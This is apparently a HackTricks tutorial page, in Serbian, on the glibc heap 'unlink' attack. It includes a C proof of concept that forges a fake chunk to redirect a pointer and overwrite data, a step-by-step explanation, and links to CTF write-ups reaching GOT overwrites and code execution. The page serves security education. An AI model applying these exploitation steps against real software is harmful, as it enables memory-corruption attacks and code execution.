# Unlink Attack

{{#include ../../banners/hacktricks-training.md}}

## Osnovne Informacije

Kada je ovaj napad otkriven, uglavnom je omogućavao WWW (Write What Where), međutim, neki **provere su dodate** čineći novu verziju napada zanimljivijom, složenijom i **beskorisnom**.

### Primer Koda:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

- Napad ne funkcioniše ako se koriste tcaches (posle 2.26)

### Cilj

Ovaj napad omogućava da **promenite pokazivač na deo da pokazuje 3 adrese pre sebe**. Ako se ova nova lokacija (okolina gde je pokazivač bio smešten) sadrži zanimljive stvari, kao što su druge kontrolisane alokacije / stek..., moguće je pročitati/prepisati ih kako bi se izazvala veća šteta.

- Ako je ovaj pokazivač bio smešten u steku, pošto sada pokazuje 3 adrese pre sebe i korisnik potencijalno može da ga pročita i izmeni, biće moguće da se otkriju osetljive informacije iz steka ili čak izmeni adresa povratka (možda) bez dodirivanja kanarija.
- U skladu sa CTF primerima, ovaj pokazivač se nalazi u nizu pokazivača na druge alokacije, stoga, čineći ga da pokazuje 3 adrese pre i imajući mogućnost da ga pročita i piše, moguće je učiniti da drugi pokazivači pokazuju na druge adrese.\
Pošto korisnik potencijalno može da čita/piše i druge alokacije, može otkriti informacije ili prepisati nove adrese na proizvoljnim lokacijama (kao u GOT-u).

### Zahtevi

- Neka kontrola u memoriji (npr. stek) da se kreira nekoliko delova dodeljujući vrednosti nekim od atributa.
- Otkriće steka kako bi se postavili pokazivači lažnog dela.

### Napad

- Postoji nekoliko delova (chunk1 i chunk2)
- Napadač kontroliše sadržaj chunk1 i zaglavlja chunk2.
- U chunk1 napadač kreira strukturu lažnog dela:
- Da bi zaobišao zaštite, osigurava da je polje `size` ispravno kako bi izbegao grešku: `corrupted size vs. prev_size while consolidating`
- i polja `fd` i `bk` lažnog dela pokazuju na mesto gde je pokazivač chunk1 smešten sa offsetima -3 i -2, respektivno, tako da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na poziciju u memoriji (stek) gde se nalazi prava adresa chunk1:

<figure><img src="../../images/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

- Zaglavlja chunk2 su modifikovana da označe da prethodni deo nije korišćen i da je veličina veličina sadržanog lažnog dela.
- Kada se drugi deo oslobodi, tada se ovaj lažni deo unlink-uje, dešavajući se:
- `fake_chunk->fd->bk` = `fake_chunk->bk`
- `fake_chunk->bk->fd` = `fake_chunk->fd`
- Prethodno je napravljeno da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na isto mesto (lokaciju u steku gde je `chunk1` bio smešten, tako da je to bila validna povezana lista). Pošto **oba pokazuju na istu lokaciju**, samo će poslednji (`fake_chunk->bk->fd = fake_chunk->fd`) imati **efekat**.
- Ovo će **prepisati pokazivač na chunk1 u steku na adresu (ili bajtove) smeštene 3 adrese pre u steku**.
- Stoga, ako bi napadač mogao ponovo da kontroliše sadržaj chunk1, moći će da **piše unutar steka**, potencijalno prepisujući adresu povratka preskočivši kanarija i menjajući vrednosti i pokazivače lokalnih promenljivih. Čak i ponovo menjajući adresu chunk1 smeštenu u steku na drugu lokaciju gde, ako bi napadač ponovo mogao da kontroliše sadržaj chunk1, mogao bi da piše bilo gde.
- Imajte na umu da je ovo bilo moguće jer su **adrese smeštene u steku**. Rizik i eksploatacija mogu zavisiti od **gde su adrese lažnog dela smeštene**.

<figure><img src="../../images/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Reference

- [https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit)
- Iako bi bilo čudno pronaći unlink napad čak i u CTF-u, ovde imate nekoliko pisanih izveštaja gde je ovaj napad korišćen:
- CTF primer: [https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html)
- U ovom primeru, umesto steka, postoji niz malloc'ovanih adresa. Unlink napad se vrši kako bi se ovde alocirao deo, stoga se može kontrolisati pokazivače niza malloc'ovanih adresa. Zatim, postoji još jedna funkcionalnost koja omogućava modifikaciju sadržaja delova u ovim adresama, što omogućava da se adrese usmere na GOT, modifikuju adrese funkcija za dobijanje leak-ova i RCE.
- Još jedan CTF primer: [https://guyinatuxedo.github.io/30-unlink/zctf16_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16_note2/index.html)
- Baš kao u prethodnom primeru, postoji niz adresa alokacija. Moguće je izvršiti unlink napad kako bi se adresa prve alokacije usmerila nekoliko pozicija pre početka niza i prepisala ovu alokaciju na novoj poziciji. Stoga, moguće je prepisati pokazivače drugih alokacija da pokazuju na GOT funkcije atoi, ispisati je da bi se dobio libc leak, a zatim prepisati atoi GOT sa adresom jednog gadgeta.
- CTF primer sa prilagođenim malloc i free funkcijama koje zloupotrebljavaju ranjivost vrlo sličnu unlink napadu: [https://guyinatuxedo.github.io/33-custom_misc_heap/csaw17_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw17_minesweeper/index.html)
- Postoji overflow koji omogućava kontrolu FD i BK pokazivača prilagođenog malloc-a koji će biti (prilagođeni) oslobođeni. Štaviše, heap ima exec bit, tako da je moguće otkriti adresu heap-a i usmeriti funkciju iz GOT-a na heap deo sa shellcode-om za izvršavanje.

{{#include ../../banners/hacktricks-training.md}}
